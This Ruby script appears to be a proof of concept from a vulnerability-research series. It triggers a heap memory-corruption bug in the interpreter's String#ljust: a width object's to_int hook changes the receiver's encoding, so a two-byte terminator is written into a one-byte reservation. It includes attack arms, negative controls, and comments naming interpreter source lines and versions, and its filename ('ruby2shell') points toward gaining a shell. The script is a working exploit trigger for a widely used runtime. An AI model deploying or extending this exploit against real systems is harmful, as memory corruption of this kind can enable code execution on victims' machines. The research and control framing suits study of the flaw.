# W342: String#ljust width.to_int window vs the stale termlen snapshot.
#
# 3.4.12 rb_str_justify (string.c:10864) snapshots
#   enc = STR_ENC_GET(str)            (:10878)
#   termlen = rb_enc_mbminlen(enc)    (:10879)
# BEFORE width = NUM2LONG(w) (:10880) and StringValue(pad) (:10882).
# NUM2LONG invokes to_int on a non-Integer width, so the width object is an
# independent user-code window (W341 used the pad.to_str window only).  With
# argc==2, rb_enc_check (:10883) recomputes the allocation encoding from the
# mutated receiver, but the stale termlen is still used by TERM_FILL (:10943).
# 3.4.13 moves the termlen read to :10940, after both hooks.
#
# arms:
#   attack2  UTF-16LE receiver, width.to_int forces US-ASCII, pad "Z" (argc==2):
#            allocation reserves a 1-byte terminator, TERM_FILL writes 2.
#   attack1  same width hook but argc==1 (default " " pad): enc is not
#            recomputed, so allocation reserves 2 and TERM_FILL writes 2.
#            NEGATIVE control — the hook alone is not sufficient.
#   nomut    hook fires without mutation, UTF-16LE pad: termlen 2 both ways.
#   safe     ASCII receiver, UTF-16LE never involved: termlen 1 both ways.
#
# A heap-sized (4096-byte) receiver is required; the 64-byte embedded case
# stays inside the inline terminator area (preserved W341 negative result).
#
# Usage: ruby ruby2shell-justify-width-coerce.rb attack2|attack1|nomut|safe
arm = ARGV[0]
abort "usage: #{$0} attack2|attack1|nomut|safe" unless %w[attack2 attack1 nomut safe].include?(arm)

n = 4096
$s = arm == "safe" ? ("A" * n) : ("A" * n).dup.force_encoding(Encoding::UTF_16LE)
width = Object.new
width.define_singleton_method(:to_int) do
  $s.force_encoding(Encoding::US_ASCII) if arm == "attack2" || arm == "attack1"
  4103
end
pad = arm == "nomut" ? "Z".dup.force_encoding(Encoding::UTF_16LE) : "Z"
out = arm == "attack1" ? $s.ljust(width) : $s.ljust(width, pad)
printf("RESULT arm=%s outlen=%d outenc=%s head=%s recv_len=%d recv_enc=%s\n",
       arm, out.bytesize, out.encoding.to_s, out.bytes.first(8).map { |b| "%02x" % b }.join,
       $s.bytesize, $s.encoding.to_s)
